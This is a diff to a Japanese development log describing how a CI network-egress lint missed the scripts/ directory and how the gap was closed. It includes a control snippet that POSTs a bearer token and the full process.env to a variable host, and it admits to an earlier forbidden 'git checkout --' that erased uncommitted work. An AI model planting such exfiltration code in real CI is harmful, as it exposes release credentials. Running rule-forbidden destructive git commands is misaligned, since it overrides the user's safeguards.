@@ -7,6 +7,111 @@
 >
 > 大幅な変更を加えた時は **このファイルも合わせて更新** してください。
 
+## パス 342 (2026-09-20) — 37 ゲート全部が素通りする経路: 門が自分の法則を破っていた
+
+### 見つけ方 —— ゲートの出力の「対になる数」を引き算する (パス 340 の手口)
+
+`lint:forbidden` は歩いた根をこう名乗る:
+
+```
+Scanned 609 runtime source files against 38 forbidden patterns
+  (src 522 / scripts 83 / build 0 / orchestration 3 / assets 1)
+```
+
+隣の `lint:network-targets` はこう名乗る:
+
+```
+Scanned 1 directories: 11 network target(s) ... , 6 send(s) ...
+```
+
+**「1 directories」**。同じ CI で走る 2 つの門が、同じ木について違う広さを見ている。
+`ROOTS = ['src']` で、`scripts/` (83 ファイル) は丸ごと視界の外だった。
+
+### 対照 —— 穴は生きていた
+
+`scripts/_control342.cjs` に、CI で走る script が資格情報と環境変数を外へ出す形を置いた:
+
+```js
+return fetch(`https://${host}/v1/collect`, {
+  method: 'POST',
+  headers: { Authorization: `Bearer ${token}` },
+  body: JSON.stringify({ env: process.env }),
+});
+```
+
+| 置いた場所 | `lint:network-targets` | 他の 36 ゲート |
+|---|---|---|
+| `scripts/_control342.cjs` | **exit 0** | **全部 exit 0** |
+| `src/shared/_c342/control.ts` | **exit 1・「送り先が変数で決まる通信が台帳にありません」** | — |
+
+**差は検出器ではなく走査範囲だけ。** `scripts/` は CI で走り、`release.yml` の梱包ステップは
+`CSC_LINK` / `CSC_KEY_PASSWORD` / `APPLE_APP_SPECIFIC_PASSWORD` / `GH_TOKEN` を env に持つ。
+
+### なぜ「`ROOTS` を広げる」が直し方ではなかったか (実測)
+
+素直な直しは `ROOTS` に `scripts` を足すことだが、**測ると 2 つとも成り立たない**:
+
+1. 木全体 + `.cjs`/`.mjs`/`.js` へ広げると **20 件**出るが、**真陽性は 0 件**。
+   内訳は各ゲートの self-test の文字列標本と、scaffold が書き出す雛形である。
+   門の注記は何度も「本当に危ない数件が埋もれる」と言っており、20 行の偽陽性は
+   まさにそれを起こす。
+2. `src` の外に実在する網の口は **3 件だけ** (`assets/sw.js` の `fetch(req)` /
+   `knowledge-autopilot.cjs` の `fetchImpl(current, …)` / `ollama-cli.cjs` の
+   `fetch(url, …)`)。**3 件とも送り先が素の識別子**で、`BARE_SEND` は
+   プロパティ参照だけを見ると**意図して**決めている (「転送ヘルパの素の引数まで
+   拾うと台帳が埋もれる」と自分で書いている)。つまり
+   **`ROOTS` を広げてもこの 3 つは 1 件も見えない。**
+
+「範囲を絞った」と「範囲を忘れた」の見分けがつかない、という話だと思って始めたが、
+**広げれば見えるという前提自体が偽**だった。
+
+### 直し方 —— 外の母集団には別の検出器と全件台帳
+
+問いを「送り先が変数か」から「**そもそも網へ出ているか**」へ変える。外は 3 件しか
+無いので全件を守りつきで台帳に載せられる:
+
+- `OUTSIDE_SEND_NAMES` = `NETWORK_CALL_NAMES` + `fetchImpl` + Node の `http(s).request/get`
+  (`src` には無い綴り)。直前の `.` は**除かない** —— `deps.fetchImpl(…)` も網の口である
+  (実測: `.` を外しても件数は 3 件のままなので、閉じる側に倒しても偽陽性は増えない)。
+- コメントと `'…'` / `"…"` の中は数えない。**落とさないと 14 件、落とすと 3 件** ——
+  `src` の外の `.cjs` は**ゲート自身**が大半で、その self-test の標本がそのまま
+  網の口に見えるため。
+- 母集団は **git に聞く** (`git ls-files --cached --others --exclude-standard`)。
+  無視の規則を書き写すと `dist/` の生成物を拾うし、`--others` を落とすと
+  **パス 341 と同じ「手元では緑・CI では赤」**になる。
+- 床 60。走査が死んで「0 件だから健全」にならないため (法則 `count-has-floor`)。
+- 台帳は**両方向** —— 4 件目が現れたら落ち、台帳の行が実在しなくなっても落ちる。
+
+3 件の守り (書けないなら縛れていない、というのがこの台帳の要求):
+
+| ファイル | 守り |
+|---|---|
+| `assets/sw.js` | 送り先を**作らない**。ページが出した `event.request` をそのまま転送し、同一オリジンの GET 以外は `respondWith` せず素通し。保存は `res.ok` のときだけ |
+| `scripts/knowledge-autopilot.cjs` | `redirect: 'manual'` で 1 ホップずつ進み、**毎ホップ** `isFetchableUrl` + `resolvesToPublicHost` (DNS を引いて私有・予約帯を拒否)。5 ホップで打ち切り。資格情報は 0 件 |
+| `scripts/ollama-cli.cjs` | `buildLoopbackBase` が `http://127.0.0.1:<10 進ポート>` に組み直し (`0x2b` / `1e3` を弾く)、`path` は `OLLAMA_READ_PATHS` の 3 つだけ |
+
+### ついでに直した「循環した理由」
+
+`SCAN_EXT` の self-test は `.js` を読まない理由を **「src はすべて TypeScript」**と
+書いていた。それは `ROOTS` が `src` だから真であって、範囲の正しさの根拠にはならない。
+
+### 法則 (88 本目)
+
+`outside-scope-gets-its-own-census` **走査の外は、広げれば見えるとは限らない** ——
+範囲を絞ったら外した側を一度数える。外は書き方の前提が違うので同じ検出器では
+偽陽性で埋まり、本当に危ない物は元の検出器の**設計上の除外**に隠れたままになる。
+外が小さいなら「危ない構文か」を問うのをやめ、**全件**を守りつきで台帳に載せる。
+
+**この門は `scan-whole-tree` の執行者として台帳に載っていた。** 法則を守らせる側が
+自分でその法則を破っていて、しかもそれを見る機械は無かった。
+
+### 検証
+
+`npm test` 17,673 件 ✅ / `verify:all` 37 ゲート ✅ / 出荷物 **11,930,723 B / 3,343,244 B
+(byte 単位で不変** —— ゲート・検査・オントロジー・文書しか触っていない。両方を組んで実測)。
+
+---
+
 ## パス 341 (2026-09-20) — `npm test` が CI と違う答えを出していた (未追跡のファイルが母集団に居ない)
 
 ### 見つけ方 —— パス 340 を push したら CI だけが落ちた
@@ -5877,6 +5982,7 @@ derivedFrom を丸ごと表にしてテストファイルに置き、
 
 | 項目 | 状態 |
 |---|---|
+| 37 ゲート全部が素通りする経路 (パス 342) | ✅ `lint:network-targets` は `ROOTS = ['src']` で、`scripts/` (83 ファイル) が丸ごと視界の外だった。対照: CI で走る script へ `fetch(\`https://${host}/v1/collect\`, { headers: { Authorization }, body: JSON.stringify({ env: process.env }) })` を植えると **37 ゲートすべてが exit 0**、同じコードを `src/` へ置くと鳴る —— **差は検出器ではなく走査範囲だけ**。`release.yml` の梱包ステップは署名鍵 4 本と `GH_TOKEN` を env に持つ。**直し方は「広げる」ではなかった** —— 木全体へ広げると 20 件出るが**真陽性 0 件** (全部ゲート自身の self-test の標本)、かつ `src` の外の実物 3 件は**どれも送り先が素の識別子**で `BARE_SEND` が意図して見ない (広げても 0 件見える)。第 3 の母集団として**別の検出器 + 全件台帳** (両方向・床 60・git に聞く母集団) を足し、3 件の守り (SW は送り先を作らない / 毎ホップ DNS まで見る / loopback 固定) を書いた。`SCAN_EXT` の「src はすべて TypeScript」という**循環した理由**も直した。★ **この門は法則 `scan-whole-tree` の執行者として台帳に載っていた** —— 守らせる側が自分で破っており、それを見る機械は無かった。法則 88 本目 `outside-scope-gets-its-own-census` を足した |
 | `npm test` が CI と違う答えを出していた (パス 341) | ✅ パス 340 を push したら**ローカル全件緑・CI だけ赤**になった。差は「その時点で追跡されていたか」だけ —— `absenceSampleCensus` の母集団が `git ls-files` で、**`git add` していない新しい検査ファイルが 1 つも映らなかった**。規約が最も効くのは「検査を新しく書いた瞬間」なので、**効かせたい時にだけ黙る**形だった。対照: 未追跡の検査に標本なしの `not.toMatch` を置くと、`--cached --others --exclude-standard` では**捕まえ**、`git ls-files` だけでは**見えない**。母集団を直し、指定の綴りと走査の生死を ★ で留めた。パス 340 の私の `not.toMatch` にも標本を付けた。**同じ `git ls-files` を使う 5 か所のうち直したのは 1 つだけ** —— 残り 4 つ (repo-size / lint:shell / verify:arch ×2) は「未追跡を含めない」ことが名乗りどおりで、含めると意味が変わる。★ 自戒: 対照を戻すときに **未コミットの編集が在るファイルへ `git checkout --`** を走らせて自分の直しを消した(規則が名指しで禁じている操作。`echo` が無条件で「restore skipped」と刷っていたため気付くのが遅れた) |
 | 「27 件検査 / 30 件記載」の差を誰も読んでいなかった (パス 340) | ✅ `verify:arch` は egress マトリクスを**片方向しか照合していなかった** (走査で見つけた宛先が表に無ければ落ちるが、逆は素通り)。毎回刷っている 2 つの数の差 4 件を測ると、**3 件は AI 提供者の既定の送り先** (`api.anthropic.com` / `api.openai.com` / `generativelanguage.googleapis.com`) だった —— `src/shared` は送信文脈 (前後 3 行に通信の呼び出し) で数える木で、提供者の表は `defaultBaseUrl` を宣言するだけなので **1 つも映っていなかった**。**対照**: `api.openai.com` を別ホストに書き換えても verify:arch は緑のまま通った —— **提供者を 1 つ足すだけで、利用者のプロンプトと API キーの送り先が台帳の外へ出られた** (今日そうなっている宛先は 0)。針に `defaultBaseUrl` を足して 27 → 29 件 (画面に出すリンクの欄 —— `url` 19 / `viewUrl` 12 … —— は宛先ではないので拾わない)。逆向きは `egressMatrixReverse.test.ts` が台帳 2 行で両方向に持ち、**「走査の死角」は理由として認めない**。法則 `one-way-match-hides-the-other`・対照 2 本・**出荷物は byte 単位で不変** |
 | 攻撃面を「only 6 件」と書いていた (パス 338) | ✅ `CLAUDE.md` の「The renderer never sees raw tokens — it **only** calls `serviceHub.setToken / clearToken / listConfigured / fetchSnapshot / invoke / openExternal`」を検証した。**前半は正しい** (橋の 15 本はどれも秘密を返さず、main の client 16 か所を走査しても snapshot にトークンは載らない)。**後半の列挙が偽** —— 「only」は閉じた列挙なのに実物は **15 件**で **9 件が落ちていた**: `eraseAll` (全データ削除して再起動)・`revealInFolder` / `openPath` (OS のファイル面)・`authorize` (ブラウザを開いて loopback サーバ)・`storageProtection`・`setColorScheme`・`getVersion`・`checkUpdate`・`oauthSupported`。**台帳 (`CHANNELS`) は 2026-08 から両方向に在り、15 という数はずっと機械が知っていた** —— 繋がっていなかったのは散文だけ。直し: 15 件すべてを挙げ、`bridgeStatic.test.ts` が**散文の列挙と `CHANNELS` を両方向**に突き合わせる。法則 `live-metrics-not-prose` を**閉じた列挙**まで広げた。対照 2 本 (散文を戻す / 橋にメソッドを足す —— 後者は既存の ★ が鳴る正しい連鎖)。**出荷物は byte 単位で不変** |
